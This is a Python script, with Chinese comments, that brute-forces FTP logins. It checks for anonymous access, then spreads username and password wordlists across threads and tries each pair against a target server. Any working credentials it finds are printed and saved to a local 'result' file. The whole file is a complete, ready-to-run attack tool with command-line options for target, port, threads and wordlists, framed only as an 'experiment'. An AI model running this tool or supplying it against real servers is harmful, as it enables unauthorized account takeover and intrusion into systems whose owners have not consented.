#!/usr/bin/python3
# -*- coding: utf-8 -*-


import ftplib
import os
import optparse
import threading


class ThreadWork(threading.Thread):
	def __init__(self,ip,usernameBlocak,passwordBlocak,port):
		threading.Thread.__init__(self)
		self.ip = ip
		self.port = int(port)
		self.usernameBlocak = usernameBlocak
		self.passwordBlocak = passwordBlocak
	
	def start(self):
		# 从帐户子块和密码子块中提取数据分配给线程进行爆破
		for userItem in self.usernameBlocak:
			for pwdItem in self.passwordBlocak:
				self.run(userItem,pwdItem)
	
	def run(self, username, password):
		try:
			print('[-]checking user[' + username + '],password[' + password + ']')
			f = ftplib.FTP(self.ip)
			f.connect(self.ip, self.port, timeout=15)
			# 若账号密码错误则会抛出异常
			f.login(username, password)
			f.quit()
			print ("\n[+] Credentials have found successfully.")
			print ("\n[+] Username : {}".format(username))
			print ("\n[+] Password : {}".format(password))
			resultFile = open('result', 'a')
			resultFile.write("success!!! username: {}, password: {}".format(username, password))
			resultFile.close()
			# 找到正确的账号密码就退出程序
			os._exit(0)
		# 捕捉账号密码错误异常
		except ftplib.error_perm:
			pass


# 列表分块函数
def partition(list, num):
	# step为每个子列表的长度
	step = int(len(list) / num)
	# 若子列表不够除为0时,就把step设置为子线程数
	if step == 0:
		step = num
	partList = [list[i:i+step] for i in range(0,len(list),step)]
	return partList


def CheckAnonymous(FTPserver):
	try:
		#检测是否允许匿名用户
		print('[-] checking user [anonymous] with password [anonymous]')
		f = ftplib.FTP(FTPserver)
		f.connect(FTPserver, 21, timeout=10)
		f.login()
		print ("\n[+] Credentials have found successfully.")
		print ("\n[+] Username : anonymous")
		print ("\n[+] Password : anonymous")
		resultFile = open('result', 'a')
		resultFile.write("success!!! username: {}, password: {}".format("anonymous", "anonymous"))
		resultFile.close()
		f.quit()
	except ftplib.all_errors:
		pass

def FTPExploit(ip,usernameFile,passwordFile,threadNumber,ftpPort):
	print("============爆破信息============")
	print("IP:" + ip)
	print("UserName:" + usernameFile)
	print("PassWord:" + passwordFile)
	print("Threads:" + str(threadNumber))
	print("Port:" + ftpPort)
	print("=================================")
	# 先检查是否允许匿名用户
	CheckAnonymous(ip)
	# 读取账号文件和密码文件并存入对应列表
	listUsername = [line.strip() for line in open(usernameFile)]
	listPassword = [line.strip() for line in open(passwordFile)]
	# 账号列表和密码列表根据线程数量进行分块
	blockUsername = partition(listUsername, threadNumber)
	blockPassword = partition(listPassword, threadNumber)
		
	threads = []
	
	# 给线程分配工作
	for sonUserBlock in blockUsername:
		for sonPwdBlock in blockPassword:
			work = ThreadWork(ip,sonUserBlock, sonPwdBlock,ftpPort)
			# 创建线程
			workThread = threading.Thread(target=work.start)
			# 在threads中加入线程
			threads.append(workThread)
	
	# 运行子线程
	for t in threads:
		t.start()
	# 阻塞主线程，等待所有子线程完成工作
	for t in threads:
		t.join()


if __name__ == '__main__':
	
	print("\n#####################################")
	print("#          ftp experiment           #")
	print("#####################################\n")
	parser = optparse.OptionParser('Example: python %prog -i 127.0.0.1 -u ./username -p ./password -t 20 -P 21\n')
	
	parser.add_option('-i', '--ip', dest='targetIP',
	                  default='127.0.0.1', type='string',
	                  help='FTP Server IP')  # 添加FTP地址参数-i
	parser.add_option('-t', '--threads', dest='threadNum',
	                  default=10, type='int',
	                  help='Number of threads [default = 10]')  # 添加线程参数-t
	parser.add_option('-u', '--username', dest='userName',
	                  default='./username', type='string',
	                  help='username file')  # 添加用户名文件参数-u
	parser.add_option('-p', '--password', dest='passWord',
	                  default='./passwords', type='string',
	                  help='password file')  # 添加密码文件参数-p(小写)
	parser.add_option('-P', '--port', dest='port',
	                  default='21', type='string',
	                  help='FTP port')  # 添加FTP端口-P(大写)
	(options, args) = parser.parse_args()
	
	try:
		FTPExploit(options.targetIP,options.userName,options.passWord,options.threadNum,options.port)
	except:
		exit(1)
